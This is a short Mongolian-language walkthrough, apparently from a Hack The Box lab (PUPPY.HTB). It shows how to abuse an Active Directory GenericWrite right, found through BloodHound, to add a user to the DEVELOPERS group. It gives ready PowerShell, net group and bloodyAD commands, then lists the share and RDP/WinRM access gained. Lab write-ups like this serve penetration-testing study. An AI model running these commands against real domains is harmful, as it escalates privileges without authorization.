# GenericWrite - user to group

BloodHound-ийн зураглалаар `LEVI.JAMES` хэрэглэгч `HR` бүлгийн гишүүн, `HR` бүлэг нь `DEVELOPERS` бүлэг дээр **GenericWrite** эрхтэй.

[image]

`LEVI.JAMES`-ийн нууц үгийг мэддэг бол дараах аргуудаар өөрийгөө `DEVELOPERS` бүлэгт нэмнэ:

### From Windows

```powershell
Import-Module ActiveDirectory
Add-ADGroupMember -Identity "DEVELOPERS" -Members "LEVI.JAMES"
```

or

```powershell
net group "DEVELOPERS" LEVI.JAMES /add /domain
```

### From Linux

```bash
bloodyAD --host <DC_IP> -d PUPPY.HTB -u levi.james -p 'password' add groupMember "DEVELOPERS" "LEVI.JAMES"
```

[image]

- `Developers` бүлэгт зөвшөөрөгдсөн сүлжээний фолдер (SMB Share) руу орж чадна.
- `Developers` бүлэгт зөвшөөрөгдсөн компьютер руу нэвтэрч (RDP/WinRM) чадна.
